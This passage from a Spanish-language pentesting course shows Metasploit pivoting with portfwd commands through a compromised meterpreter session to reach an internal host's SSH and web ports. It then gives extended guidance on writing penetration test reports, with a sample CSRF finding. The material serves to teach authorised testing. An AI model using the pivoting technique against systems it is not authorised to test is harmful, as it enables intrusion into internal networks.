Bas√°ndonos en el mismo escenario visito hasta ahora lab 1. Desde la m√°quina Kali (m√°quina A) nos intentamos conectar a la m√°quina Linux al puerto 22 (m√°quina C), que sabemos que est√° abierto, y vemos que no podemos conectarnos directamente ya que desde la m√°quina Kali no tenemos visibilidad hacia la red 11.0.0.0/24.

Sin embargo desde la sesi√≥n 1 donde tenemos nuestro meterpreter de la m√°quina Ubuntu (m√°quina B) esta si tiene visibilidad con la red 11.0.0.0/24 donde est√° m√°quina Linux (m√°quina C). Desde el meterpreter de la sesi√≥n 1 agregamos una nueva regla de reenv√≠o de puertos.

> portfwd add -l <local_port> -p <remote_port> -r <remote_host>

> portfwd add -l 9500 -p 22 -r 11.0.0.10

Con esto indicamos que todas las peticiones que hagamos al puerto local de la m√°quina A Kali sen reenviadas al puerto 22 de la ip 11.0.0.10 que ser√° la m√°quina C Linux. Siendo la m√°quina B Ubuntu quien haga el reenv√≠o de puertos entre la m√°quina A y C. De ah√≠ que todo el tr√°fico que llegue a la m√°quina C Linux es como si lo realizase la m√°quina B Ubuntu cuando en realidad lo env√≠a la m√°quina A Kali.

Comprobando nuevamente el intento de conexi√≥n vemos como ahora **desde Metasploit Framework como desde la propia m√°quina local Kali** podemos llegar a la m√°quina C Linux estableciendo una conexi√≥n localhost hacia le puerto local a la escucha.

Si listamos los puertos a la escucha de la m√°quina local vemos como fuera del MSF tenemos el puerto 9500 a la escucha. Esto puede ser √∫til en los casos en los que necesitemos utilizar servicios web u otras herramientas fuera de Metasploit para poder escanear, vulnerar o realizar acciones hacia una m√°quina remota en la que no tendr√≠amos un acceso directo pero si conocemos su IP y puerto y tenemos una m√°quina que usaremos de pivoting en medio de la comunicaci√≥n para realizar los reenv√≠os de puertos. Tener en cuenta que podemos agregar m√°s de una regla port forwarding.

![local Kali](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/local-kali.png?raw=true)

La forma de usar m√≥dulos dentro de Metasploit con reglas configuradas de reenv√≠o de puertos es solamente por medio de conexiones locales (ip y puerto local). En el siguiente ejemplo se muestran dos reglas port forwarding establecidas en la sesi√≥n 1 (m√°quina B Ubuntu), la segunda regla indica que las peticiones que se realicen hacia el puerto 9000 desde cualquier interface de la m√°quina Kali A se reenv√≠en a trav√©s de la sesi√≥n 2 (m√°quina B Ubuntu) hacia la IP destino 11.0.0.10 puerto 80 que ser√° la m√°quina C Linux.

***RHOST***: ser√° la direcci√≥n local de la m√°quina A Kali, ip 127.0.0.1 (y no la ip 11.0.0.10 de la m√°quina destino C Linux).

***PORTS***: ser√° el puerto local a la escucha en la m√°quina A Kali, puerto 9000 (y no el puerto 80 de la m√°quina destino C Linux).

Vemos como nos indica que el puerto 9000 de la ip 127.0.0.1 est√° Open. Esto significa que la regla de reenv√≠o funcion√≥ y que realmente esa IP/Puerto local corresponder√≠an a la IP/Puerto destino configurado en la regla del portfwd. Fuera de Metasploit podemos consultar los puertos a la escucha con netstat y comprobar que tanto el puerto 9500, visto en el ejemplo anterior, como el puerto 9000 est√°n a la escucha por un proceso ruby que ser√≠a Metasploit.

![portfwd](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/portfwd.png?raw=true)

## **¬øDiferencias entre route y portfwd en Metasploit?**

**Route y Autoroute**

- Es necesario tener una sesi√≥n establecida.
- Agrega direcciones de red completas indicando su notaci√≥n CIDR.
- Las tablas de rutas solo se agregan a nivel funcional de Metasploit Framework.
- Dentro de Metasploit se pueden usar todos los m√≥dulos de forma directa hacia las redes agregadas.
- Con el m√≥dulo post Autorute se pueden descubrir y agregar rutas de red de forma autom√°tica de una sesi√≥n previamente establecida.

**Portfwd**

- Es necesario tener una sesi√≥n establecida.
- No pueden agregar direcciones completas de red, solo se crean reglas de port forwarding hac√≠a una IP/Puerto espec√≠fico.
- Se pueden usar otras herramientas fuera de Metasploit a nivel local de la propia m√°quina Kali IP/Puerto locales estar√°n a la escucha.
- Dentro de Metasploit se pueden usar m√≥dulos hacia la IP/Puerto de la regla creada, la IP/Puerto ser√° interpretado de forma local desde la propia m√°quina Kali.

# 7. Reporte de resultados:

# **Documentaci√≥n de las actividades realizadas durante el pentesting**

La documentaci√≥n es una parte crucial del proceso de pentesting y contribuye a la transparencia, claridad y seguimiento del trabajo realizado. Aqu√≠ hay una descripci√≥n de c√≥mo se documentan las actividades durante el pentesting:

- Informe de Alcance: Detalla los objetivos, limitaciones, y el alcance del pentesting. Define claramente lo que est√° permitido y lo que no.
- Reconocimiento: Incluye resultados de escaneo de informaci√≥n p√∫blica, WHOIS, DNS, y cualquier otro m√©todo utilizado para recopilar informaci√≥n sobre el objetivo.
- Escaneo de Vulnerabilidades: Lista de vulnerabilidades encontradas utilizando herramientas de escaneo automatizado.
- Exploits Utilizados: Detalle de exploits empleados y c√≥mo se llevaron a cabo, incluyendo cualquier ajuste o personalizaci√≥n necesaria.
- Resultados de Pruebas de Penetraci√≥n: Documenta las pruebas manuales realizadas, incluyendo la explotaci√≥n de vulnerabilidades y el acceso a sistemas.
- Registro de Actividades del Sistema: Detalles de las acciones realizadas en los sistemas objetivo. Incluye comandos ejecutados, cambios realizados, y cualquier actividad relevante.
- Capturas de Pantalla y Evidencia: Im√°genes que respaldan los resultados y demuestran la explotaci√≥n exitosa o la identificaci√≥n de vulnerabilidades.
- Recopilaci√≥n de Datos: Detalles sobre cualquier informaci√≥n confidencial o sensible recopilada durante el pentesting.
- Recomendaciones de Mitigaci√≥n: Propuestas para abordar y corregir las vulnerabilidades encontradas. Incluye pasos espec√≠ficos y mejores pr√°cticas.
- Conclusiones y Resumen Ejecutivo: Un resumen general de las actividades, hallazgos clave, y una evaluaci√≥n del riesgo. Dirigido a un p√∫blico no t√©cnico.
- Firmas y Autorizaciones: Incluye firmas del equipo de seguridad y las partes autorizadas que respaldan la validez y el alcance del informe.
- Revisi√≥n con el Cliente: Sesi√≥n para revisar el informe con el cliente, aclarar dudas y discutir los resultados.

<aside>
üëâ La documentaci√≥n precisa y completa es esencial para garantizar la efectividad y la integridad de las pruebas de penetraci√≥n, as√≠ como para proporcionar a los clientes la informaci√≥n necesaria para mejorar su postura de seguridad.

</aside>

## **Crear un informe de pentesting**

Es una pregunta muy habitual entre profesionales que est√°n empezando a trabajar en pentesting y aunque hay plantillas que se pueden encontrar f√°cilmente en internet y algunas herramientas los generan autom√°ticamente, como profesionales debemos seguir ciertas normas a la hora de elaborar los documentos que debo entregar a los clientes tras finalizar los trabajos.

## **Nociones b√°sicas**

La elaboraci√≥n de informes es una de las cuestiones m√°s importantes en cualquier auditor√≠a y en ellos se debe reflejar de forma clara y concisa los descubrimientos y conclusiones a las que has llegado. Cualquier informe normalmente debe incluir como m√≠nimo lo siguiente:

## **Portada:**

La portada del documento suele ser gen√©rica e incluye entre otras cosas, informaci√≥n sobre la empresa, fecha en la que se entrega el documento y detalles b√°sicos.

![portada](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/portada.png?raw=true)

## **√çndice:**

En el √≠ndice es com√∫n incluir enlaces o accesos directos para que sea f√°cil moverse por las diferentes secciones del documento. Ejemplo:

### **CONTENIDO**

ALCANCE..........................................................................................................................................................4

HOJA DE REVISION...........................................................................................................................................5

OBJETIVOS y METODOLOG√çA DE TRABAJO......................................................................................................6

Descripci√≥n General de Pruebas por Fase de Pentesting................................................................................7

Explotaci√≥n ......................................................................................................................................................9

Calificaci√≥n global del riesgo .........................................................................................................................10

NIVEL ALTO - Ausencia de fichas (tokens) Anti-CSRF ....................................................................................11

CONSECUENCIAS........................................................................................................................................12

SOLUCI√ìN ..................................................................................................................................................13

EVIDENCIA Y REFERENCIAS ........................................................................................................................14

NIVEL ALTO ‚Äì Content Security Policy (CSP) Header Not SeT .......................................................................15

CONSECUENCIAS........................................................................................................................................16

SOLUCI√ìN ..................................................................................................................................................17

EVIDENCIA Y REFERENCIAS ........................................................................................................................18

NIVEL ALTO - Missing Anti-clickjacking Header.............................................................................................19

CONSECUENCIAS........................................................................................................................................20

SOLUCI√ìN ..................................................................................................................................................21

EVIDENCIA Y REFERENCIAS ........................................................................................................................22

NIVEL MEDIO - Application Error Disclosure .................................................................................................23

CONSECUENCIAS........................................................................................................................................24

SOLUCI√ìN ..................................................................................................................................................25

EVIDENCIA Y REFERENCIAS ........................................................................................................................26

NIVEL MEDIO ‚Äì Cookie No HttpOnly Flag......................................................................................................27

CONSECUENCIAS........................................................................................................................................28

SOLUCI√ìN ..................................................................................................................................................29

EVIDENCIA Y REFERENCIAS ........................................................................................................................30

NIVEL MEDIO ‚Äì Cookie Without Secure Flag.................................................................................................31

CONSECUENCIAS........................................................................................................................................32

SOLUCI√ìN ..................................................................................................................................................33

EVIDENCIA Y REFERENCIAS ........................................................................................................................34

NIVEL MEDIO ‚Äì Cookie Without Secure Flag.................................................................................................35

CONSECUENCIAS........................................................................................................................................36

SOLUCI√ìN ..................................................................................................................................................37

EVIDENCIA Y REFERENCIAS ........................................................................................................................38

NIVEL MEDIO - Permissions Policy Header Not Set.......................................................................................39

CONSECUENCIAS........................................................................................................................................40

SOLUCI√ìN ..................................................................................................................................................41

EVIDENCIA Y REFERENCIAS ........................................................................................................................42

NIVEL MEDIO - SSL/TLS usa algoritmos hashing y cifrado d√©biles ................................................................43

CONSECUENCIAS........................................................................................................................................44

SOLUCI√ìN ..................................................................................................................................................44

EVIDENCIA Y REFERENCIAS ........................................................................................................................46

NIVEL MEDIO - Strict-Transport-Security Header Not Set.............................................................................47

CONSECUENCIAS........................................................................................................................................48

SOLUCI√ìN ..................................................................................................................................................49

EVIDENCIA Y REFERENCIAS ........................................................................................................................50

NIVEL MEDIO - X-Content-Type-Options Header Missing.............................................................................51

CONSECUENCIAS........................................................................................................................................52

SOLUCI√ìN ..................................................................................................................................................53

EVIDENCIA Y REFERENCIAS ........................................................................................................................54

NIVEL Info ‚Äì Informaci√≥n General .................................................................................................................55

NIVEL Info - B√∫squeda Inversa de IP..............................................................................................................58

NIVEL Info - An√°lisis de IP ..............................................................................................................................59

NIVEL Info - An√°lisis DEL DOMINIO ...............................................................................................................61

NIVEL Info - An√°lisis DE Puertos ....................................................................................................................62

NIVEL Info - An√°lisis SSL.................................................................................................................................67

NIVEL Info - An√°lisis DE Servicios...................................................................................................................70

## **Control de versiones:**

El control de versiones debe incluir como m√≠nimo, una descripci√≥n de los cambios introducidos en cada modificaci√≥n del documento con una fecha y autor. Ejemplo:

### **Hoja de revisi√≥n**

![Hoja](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/hoja.png?raw=true)

## **Disclaimer y confidencialidad de la informaci√≥n**

### **Alcance**

El alcance del presente trabajo consisti√≥ en la evaluaci√≥n del riesgo de seguridad y su grado de exposici√≥n a trav√©s de t√©cnicas de intrusi√≥n. Se utilizaron herramientas de seguridad, analizadores de vulnerabilidades y metodolog√≠as de recolecci√≥n de informaci√≥n del mismo modo que ser√≠an utilizadas por los atacantes.

Las tareas llevadas a cabo comprenden el reconocimiento activo de sistemas con el fin de evaluar los riesgos potenciales de los mismos. Finalmente se realiz√≥ un an√°lisis e intento de intrusi√≥n sobre los sistemas activos, con el prop√≥sito de hallar las potenciales vulnerabilidades que puedan afectarlos. Los objetivos realizados para el Pentest son la selecci√≥n del dominio, sistemas, servicios y aplicativos sobre las siguientes direcciones IP y Dominios:

**200.190.180.170: webdelcliente.com**

El cliente contrat√≥ a Router ID para llevar a cabo una auditor√≠a externa contra sus sitios y aplicativos webs para proporcionar una demostraci√≥n pr√°ctica de la eficacia de sus sistemas y metodolog√≠a de seguridad, as√≠ como para proporcionar una estimaci√≥n de su susceptibilidad a la explotaci√≥n, integridad, exposici√≥n o perdida de datos.

La prueba se realiz√≥ de acuerdo con el M√©todo de Pruebas de Penetraci√≥n de Seguridad de la Informaci√≥n de Router ID. El Analista de Seguridad de la Informaci√≥n (ISA) de Router ID llev√≥ a cabo La auditor√≠a en coordinaci√≥n con los miembros del personal de Tecnolog√≠a de la Informaci√≥n (TI) del cliente para garantizar pruebas seguras, ordenadas y completas dentro del alcance aprobado.

Contemple la gran importancia de solucionar estas brechas de seguridad que permiten un gran riesgo de violaci√≥n de cumplimiento y potencialmente sujeto a multas y p√©rdida de reputaci√≥n empresarial.

El presente Informe contiene informaci√≥n confidencial, no debe ser enviado v√≠a mail, fax o cualquier otro medio electr√≥nico a menos que este se encuentre espec√≠ficamente aprobado por las pol√≠ticas de seguridad de la Compa√±√≠a. Todas las copias electr√≥nicas o en papel del presente documento deben ser guardadas en un sitio protegido.

No comparta la informaci√≥n contenida en este documento, a menos que la otra persona est√© autorizada para ello. router-id.com da permiso para copiar este informe con el fin de difundir informaci√≥n dentro de su organizaci√≥n o cualquier agencia reguladora.

## **Metodolog√≠as utilizadas**

### Objetivos y metodolog√≠as de trabajo

Este documento detalla la evaluaci√≥n de seguridad referido al **Pentesting externo**. El objetivo de este trabajo fue identificar las vulnerabilidades dentro del alcance acordado entre las partes, y los riesgos que pueden causar en el negocio de la empresa.

Es tu responsabilidad implementar las recomendaciones que se har√°n, con el objetivo de aumentar la seguridad en los dominios (desarrollo de aplicaciones, soporte de infraestructura), as√≠ como gestionar el nivel de exposici√≥n a los riesgos de la organizaci√≥n y la adecuaci√≥n a las cuestiones regulatorias.

Si no dispones de personal calificado para esta tarea nosotros podemos llevarla a cabo. ***Consulta por nuestro servicio de correcci√≥n de fallas de seguridad y hardening.***

**Los Objetivos espec√≠ficos son:**

- Detectar vulnerabilidades y problemas de seguridad que puedan ser aprovechados por atacantes.
- Evaluar la efectividad y respuesta de los sistemas de seguridad implementados (Firewalls, detecci√≥n de intrusos y otros sistemas).
- Analizar y determinar el nivel de exposici√≥n de la infraestructura tecnol√≥gica de los sistemas de acuerdo con las vulnerabilidades detectadas.
- Presentar recomendaciones concretas que permitan corregir los problemas y brechas de seguridad detectados y minimizar los riesgos asociados.

## **Contexto de la auditor√≠a y nociones generales**

### Descripci√≥n general de pruebas de fase por pentesting

1. Advanced SQL Injection

2. An√°lisis de IP

3. An√°lisis de metadatos

4. An√°lisis de Puertos

5. An√°lisis de Servicios

6. An√°lisis de servicios web

7. An√°lisis del Dominio

8. An√°lisis SSL

9. Apache no soportado

10. Application Error Disclosure

11. Archivo robots y sitemap

12. Archivos de backup

13. Ataque al Host Header

14. Ausencia de CAPTCHA

15. Ausencia de fichas (tokens) Anti-CSRF

16. Autenticaci√≥n

17. Autocomplete

18. B√∫squeda Inversa de IP

19. Componentes cliente desactualizados

20. Comprobaci√≥n de tokens anti-CSRF

21. Configuraci√≥n de la red de prueba / infraestructura

22. Configuraci√≥n Incorrecta de CORS / Cross-Origin Resource Sharing

23. Confusi√≥n de Ruta Relative

24. Contenido HTTPS Disponible v√≠a HTTP

25. Content Security Policy (CSP) Header Not SeT

26. Contrase√±a de texto claro

27. Cookie No HttpOnly Flag

28. Cross Site Scripting

29. Cross-Domain JavaScript Source File Inclusion

30. Definici√≥n de Roles

31. Descarga de documentos sin sesi√≥n v√°lida

32. Desconfiguraci√≥n de Dominio Cruzado / Control de acceso HTTP

33. Detecci√≥n y fortaleza del Firewall

34. Divulgaci√≥n de informaci√≥n - Directivas inseguras de PHP

35. DIVULGACI√ìN DE INFORMACI√ìN - Manejo de errores inapropiados

36. DIVULGACI√ìN DE INFORMACI√ìN - mediante ''X-Powered-By''

37. Divulgaci√≥n de informaci√≥n - Mensajes de error de depuraci√≥n

38. Divulgaci√≥n de la marca de hora - Unix

39. Divulgaci√≥n de Proxy

40. Divulgaci√≥n de versi√≥n IIS y .NET

41. Entrada de usuario o login

42. Esquema de autorizaci√≥n de omisi√≥n

43. Esquema de gesti√≥n de sesi√≥n

44. Fuga de informaci√≥n

45. HSTS Missing From HTTPS Server (RFC 6797)

46. HTTP TRACE Methods Allowed

47. Informaci√≥n General

48. Inyecci√≥n NoSQL - MongoDB

49. Inyecci√≥n Remota de Comandos del Sistema Operativo

50. Inyecci√≥n XSLT

51. Listado de directorios

52. Mapas del sitio web

53. Missing Anti-clickjacking Header

54. Path Traversal

55. Permissions Policy Header Not Set

56. PHP m√∫ltiples vulnerabilidades

57. Pol√≠tica de Usuario d√©bil o no forzada

58. Private IP Disclosure

59. Redirecciones no controladas

60. Reuni√≥n de la Informaci√≥n Reconocimiento en Motores de B√∫squeda

61. Saltando 403

62. Secure Pages Include Mixed Content

63. Server-side template injection

64. SQL Injection

65. SSL/TLS, SSLv2 y SSLv3 detecci√≥n

66. Strict-Transport-Security Header Not Set

67. SUB RESOURCE INTEGRITY ATTRIBUTE MISSING

68. Unauthenticated Blind SSRF via DNS Rebinding

69. Uploading de archivos sin restricci√≥n

70. Variables de sesi√≥n expuestas

71. WordPress, Temas Y Plugins Desactualizados

72. X-Content-Type-Options Header Missing

### Explotaci√≥n

La fase de explotaci√≥n consiste en realizar todas aquellas acciones que puedan comprometer al sistema auditado, a los usuarios o a la informaci√≥n que maneja. Principalmente se comprueba que no se puedan realizar ataques tipo:

- Inyecci√≥n de c√≥digo
- Inclusi√≥n de ficheros locales o remotos
- Evasi√≥n de autenticaci√≥n
- Carencia de controles de autorizaci√≥n
- Ejecuci√≥n de comandos en el lado del servidor
- Ataques tipo Cross Site Request Forgery
- Control de errores
- Gesti√≥n de sesiones
- Fugas de informaci√≥n
- Secuestros de sesi√≥n
- Comprobaci√≥n de las condiciones para realizar una denegaci√≥n de servicio
- Carga de ficheros maliciosos

<aside>
üëâ Estos tipos de ataques se realizan adaptando el desarrollo de cada ataque, t√©cnicas en uso y las √∫ltimas tecnolog√≠as disponibles.

</aside>

### **Post explotaci√≥n**

En caso de encontrarse una vulnerabilidad que permita realizar otras acciones en el sistema auditado o en su entorno, se realizar√°n controles adicionales con el objetivo de comprobar la criticidad de esta. En funci√≥n de las posibilidades que permita una vulnerabilidad concreta, se intentar√°n realizar las siguientes acciones de post-explotaci√≥n:

- Obtenci√≥n de informaci√≥n confidencial
- Evasi√≥n de mecanismos de autenticaci√≥n
- Realizar acciones del lado de los usuarios
- Realizar acciones o ejecutar comandos en el servidor que aloja la aplicaci√≥n
- Privilegios disponibles en el servidor (si se consigue acceso al mismo)
- Otros sistemas o servicios accesibles desde la aplicaci√≥n comprometida
- Realizar acciones sin el consentimiento del usuario

<aside>
üìñ La posibilidad de encadenar varias vulnerabilidades para conseguir un acceso de mayor nivel o para evadir los controles de seguridad tambi√©n ser√°n escenarios valorados a la hora de realizar el an√°lisis de riesgos. Utilizamos varias metodolog√≠as, pero nos vamos a centrar en OWASP TOP 10 ‚Äì 2021.
</aside>

Una organizaci√≥n sin √°nimo de lucro a nivel mundial dedicada a mejorar la seguridad de las aplicaciones y del software en general.

[https://owasp.org/Top10/es/](https://owasp.org/Top10/es/)

## Calificaci√≥n global del riesgo

Habiendo considerado los resultados potenciales y los niveles de riesgo evaluados para cada actividad de prueba documentada, Hackware considera que la exposici√≥n global al riesgo con respecto a los intentos de actores maliciosos de violar y controlar los recursos dentro de su entorno de informaci√≥n es ALTO (seg√∫n lo determinado utilizando la Clasificaci√≥n del riesgo Puntuaci√≥n CVSSv3).

[https://www.incibe-cert.es/blog/cvss3-0](https://www.incibe-cert.es/blog/cvss3-0)

La tabla que figura a continuaci√≥n proporciona una clave para la denominaci√≥n de los riesgos y los colores utilizados a lo largo de este informe para ofrecer un sistema de puntuaci√≥n de riesgos claro y conciso.

Cabe se√±alar que la cuantificaci√≥n del riesgo empresarial global planteado por cualquiera de los problemas detectados en las pruebas queda fuera de nuestro alcance. Esto significa que algunos riesgos pueden considerarse elevados desde un punto de vista t√©cnico, pero, como resultado de otros controles que desconocemos, pueden ser cr√≠ticos o no desde un punto de vista empresarial.

| Risk Rating | CVSSv3 Score | Descripci√≥n |
| --- | --- | --- |
| CRITICAL | 9.0 ‚Äì 10 | Se ha descubierto una vulnerabilidad cr√≠tica. Es necesario resolverla lo antes posible. |
| HIGH | 7.0 ‚Äì 8.9 | Se ha descubierto una vulnerabilidad alta. Esto requiere una resoluci√≥n a corto plazo. |
| MEDIUM | 4.0 ‚Äì 6.9 | Se ha descubierto una vulnerabilidad media.Debe resolverse a lo largo del proceso de mantenimiento. |
| LOW | 0.1 ‚Äì 3.9 | Se ha descubierto una vulnerabilidad baja. Esto debe abordarse como parte de las tareas de mantenimiento rutinario. |
| INFO | 0 | Se ha producido un descubrimiento que se notifica a t√≠tulo informativo. Debe abordarse para cumplir con las pr√°cticas l√≠deres. |
- Pruebas realizadas, descubrimientos y pruebas de concepto. (lo veremos en m√°s profundidad)
- Conclusiones y recomendaciones. (lo veremos en m√°s profundidad)

En la introducci√≥n y contexto del documento, se describen detalles sobre la auditor√≠a a realizar y su alcance, algo que evidentemente tambi√©n se debe de encontrar reflejado en el acuerdo firmado con el cliente. Esta parte del documento pretende informar al lector sobre cu√°les son las pruebas que se han realizado sin entrar en demasiados detalles, a modo de resumen ejecutivo.

Otro detalle importante que es necesario tener en cuenta en cualquier informe, es la secci√≥n correspondiente a las metodolog√≠as utilizadas, las cuales en todo caso depender√°n de la auditor√≠a a realizar. Es altamente recomendable implementar metodolog√≠as que ya han sido depuradas y tengan una buena aceptaci√≥n por parte de la industria. Por ejemplo, algunas metodolog√≠as interesantes se listan a continuaci√≥n, aunque evidentemente aplican en funci√≥n del tipo de auditor√≠a realizada:

- Penetration Testing Execution Standard (PTES)
- PCI (Payment Card Industry) Penetration testing guide
- Open Source Security Testing Methodology Manual (OSSTMM)
- OWASP Top 10
- OWASP Testing Guide
- OWASP Mobile Top 10
- OWASP API Top 10

El contenido propiamente dicho del documento debe de incluir las pruebas que se han realizado, explicando cada una de las etapas de la auditor√≠a, herramientas y t√©cnicas utilizadas, as√≠ como los resultados de cada una. Se trata de una secci√≥n en donde es importante incluir los detalles de la forma m√°s clara y concisa, evitando redundancias y bloques de c√≥digo o salidas de log demasiado extensas con el fin de favorecer la legibilidad del documento. En el caso de que sea necesario incluir dichos elementos, ser√≠a recomendable abordarlos en anexos independientes para que el lector los pueda revisar por separado. En este punto, probablemente lo m√°s importante es que la informaci√≥n aporte valor. Es decir, no sirve de nada incluir cada una de las pruebas de concepto que se han ejecutado si no han producido los resultados esperados. Solo se debe incluir informaci√≥n relevante y de inter√©s para el objeto de la auditor√≠a. De nada sirve dedicar 2 o 3 p√°ginas del informe explicando que se ha lanzado un exploit para el Apache (por poner un ejemplo) si dicho exploit no ha funcionado debido a que probablemente el servicio no es vulnerable. Incluye solo informaci√≥n que aporte valor.

Finalmente, en la secci√≥n de recomendaciones viene bien incluir algunos puntos a tener en cuenta para mejorar la seguridad del sistema auditado, aunque tambi√©n se pueden resaltar aquellas configuraciones y/o buenas pr√°cticas que se est√°n llevando a cabo con el fin de que el cliente siga haciendo uso de ellas y alentar a su mantenimiento. Si se encuentran vulnerabilidades es muy importante incluir contramedidas o recomendaciones que sean √∫tiles para mitigarlas o mecanismos de protecci√≥n que ayuden a solucionar los problemas detectados. Ojo, el hecho de incluir esas contramedidas no es vinculante y no significa que seas t√∫ quien las va a implementar. Te han contratado para ejecutar una auditor√≠a y detectar problemas, implementar las soluciones es algo que debe valorar el cliente.

## **Tipo de auditor√≠a**

Se pueden crear diferentes tipos de informes dependiendo de las necesidades del cliente, las cuales han tenido que quedar reflejadas en el acuerdo. Es posible que la auditor√≠a a realizar se centre en uno de los siguientes escenarios:

- Pentesting perimetral/externo.
- Pentesting interno.
- Pentesting wireless

Dependiendo de cada caso hay que tener en cuenta factores adicionales que deben quedar reflejados en el documento, por ejemplo cuando un cliente pide un enfoque mixto y una parte de la auditor√≠a ser√° externa y otra parte interna.

## **Informe t√©cnico e Informe ejecutivo**

Con todo lo anterior claro, lo primero que hay que tener en cuenta es que no todos los clientes son iguales y en algunos casos es necesario desarrollar 2 o m√°s informes que reflejen las tareas realizadas. Es importante adaptarse y entender el p√∫blico objetivo. Es decir, si la persona que va a leer el informe es personal t√©cnico le interesar√° que est√© orientado a describir las vulnerabilidades, defectos y recomendaciones que aporta el documento. En este caso ser√° revisado por una persona que como m√≠nimo, tiene unos conocimientos b√°sicos y entender√° lo que cuentas pero si por ejemplo, ese mismo documento lo lee un directivo, responsable de √°rea o personal no t√©cnico, evidentemente lo m√°s probable es que entienda poco o nada. Imagina por un instante que un experto en finanzas (por poner un ejemplo) te pasa un informe t√©cnico de una auditor√≠a financiera, crees que tendr√°s el criterio suficiente para decir si eso que te han enviado est√° ¬´bien¬ª o ¬´mal¬ª? probablemente pasar√°s de leerlo y se lo enviar√°s a alguien que sea experto en el tema. Dependiendo del alcance y lo que se haya hablado con el cliente es probable que tengas que elaborar un informe orientado al personal t√©cnico y otro a ¬´decision makers¬ª o directivos/responsables, en cada caso el lenguaje que utilizas y el mensaje que transmites debe ser lo suficientemente claro para el lector objetivo.

## **Las plantillas no hacen un buen informe.**

Puedes usar plantillas disponibles en Internet o las que a lo mejor se encuentran disponibles en la empresa en la que trabajas, por supuesto que es algo perfectamente valido pero no deja de ser una base que te ayuda a ahorrar tiempo en definir un dise√±o y ¬´maquetar¬ª secciones. Puedes (y debes) adaptar la plantilla a la auditor√≠a que est√°s realizando, no es algo est√°tico que debes seguir a rajatabla. Si te hace falta a√±adir, quitar o mover secciones lo haces y ya est√°. Que la plantilla que utilices no se convierta en un problema, se ha creado precisamente para que puedas hacer el trabajo m√°s r√°pido.

# **Elaboraci√≥n de informes claros y concisos**

## **C√≥mo Redactar un Informe de Pentesting con √âxito**

1.  Planificaci√≥n en la Redacci√≥n: Evita dejar la redacci√≥n del informe para el √∫ltimo momento. Documenta hallazgos durante la auditor√≠a y elimina informaci√≥n innecesaria para evitar un informe extenso pero carente de valor.
2. Revisi√≥n por Pares: La redacci√≥n es un arte. Pide a un colega que lea el informe antes de entregarlo. La claridad para ti puede no ser igual para los dem√°s. Obtener una segunda opini√≥n ayuda a detectar errores y mejorar la comprensi√≥n del mensaje.
3. Facilita la Lectura con Elementos Visuales: Incorpora capturas de pantalla para ilustrar puntos clave. Mant√©n la calidad sobre la cantidad; la concisi√≥n es clave. Evita detalles irrelevantes y enf√≥cate en la informaci√≥n esencial.
4. Niveles de Criticidad: Asigna niveles de gravedad a cada vulnerabilidad seg√∫n el modelo de CVS. Destaca la urgencia de solucionar problemas cr√≠ticos y distingue aquellos menos preocupantes.
5. Buenas Pr√°cticas en la Redacci√≥n: Atiende a detalles ortogr√°ficos para una presentaci√≥n profesional. Incluye informaci√≥n de contacto, horarios y canales de comunicaci√≥n. Consulta con el cliente antes de sugerir actualizaciones en servicios desactualizados.
6. Recomendaciones Pr√°cticas: En las capturas, preserva la privacidad evitando informaci√≥n sensible. Adjunta PoCs y exploits en anexos. Usa enlaces para conceptos t√©cnicos. Facilita recomendaciones en formato de "checklist" y proporciona referencias e instrucciones adicionales.
7. Evita Excesos y Opiniones Personales: Ajusta la cantidad de capturas para evitar excesos. S√© neutral; evita opiniones personales. Mant√©n un equilibrio para que el informe no parezca un √°lbum de fotos, sino un documento de calidad.
8.  Historial de Eventos: Incluye un historial con cambios de alcance, organizativos, disposici√≥n de sistemas y eventos relevantes. Proporciona un contexto cronol√≥gico que mejore la comprensi√≥n del proceso de auditor√≠a.
9. Herramientas y Plantillas √ötiles: Utiliza plantillas de PurpleSec, Pentest-hub, TCM Security, Offensive Security y TGB Security. Explora la herramienta PWNDoc para una gesti√≥n eficiente de informes.

# **Comunicaci√≥n de las vulnerabilidades encontradas y recomendaciones de mitigaci√≥n**

Ejemplos de Vulnerabilidades encontradas, pruebas, consecuencias y recomendaciones de mitigaci√≥n.

## Nivel alto - ausencia de fichas (tokens) anti-csrf

No se encontraron fichas (tokens) Anti-CSRF en formularios HTML. Esto permite una solicitud falsa entre sitios en un ataque que compromete y obliga a una v√≠ctima a enviar su solicitud HTTP a un destino objetivo sin su conocimiento o intenci√≥n para poder realizar una acci√≥n como si fuera el usuario legitimo. La causa es la funcionalidad oculta de la aplicaci√≥n utilizando acciones de URL/formulario que pueden ser adivinados de forma repetible.

![tokens](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/tokens.png?raw=true)

La naturaleza del ataque es que CSRG explota la confianza que un sitio web proporciona a un usuario. Por el contrario, las cadenas de comandos de los sitios cruzados (XSS) explotan la confianza que un usuario proporciona en un sitio web.

Al igual que XSS, los ataques CSRG no tienen por qu√© ser de sitios cruzados, pero hay la posibilidad de que puedan serlo. La falsificaci√≥n de las solicitudes ente los sitios tambi√©n se conoce como CSRF, XSRG y ataques con un solo clic. Los ataques de CSRG son muy efectivos en varias situaciones, que incluyen:

- La victima tiene una sesi√≥n activa en el sitio de destino.
- La v√≠ctima se autoriza por medio de la autenticaci√≥n HTTP en el sitio de destino.
- La v√≠ctima se encuentra en la misma red local que el sitio de destino.

CSRF se ha utilizado especialmente para poder realizar una acci√≥n contra un sitio objetivo utilizando los privilegios de la v√≠ctima, pero se han revelado t√©cnicas recientes para difundir informaci√≥n al obtener el acceso a la respuesta.

El riesgo de divulgaci√≥n de informaci√≥n aumenta de forma dr√°stica cuando el sitio de destino se encuentra vulnerable a XSS, porque XSS se puede utilizar como una plataforma para CSRF, lo que le permite al atacante que opere desde adentro de los l√≠mites de la misma pol√≠tica de origen.

## **Consecuencias**

Cuando se lleva a cabo con √©xito, un ataque CSRF puede tener una amplia variedad de repercusiones, seg√∫n los privilegios de la v√≠ctima. Si el objetivo es un usuario est√°ndar, es probable que toda su cuenta se vea comprometida, desde su informaci√≥n personal hasta sus privilegios en el sitio.

Y eso no es nada comparado con el impacto de un ataque CSRF en la cuenta de un administrador: podr√≠a paralizar todo el sitio. Dada la magnitud de un posible ataque CSRF, es esencial que cualquier paquete de seguridad web pueda proteger contra √©l.

![csrf](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/csrf.png?raw=true)

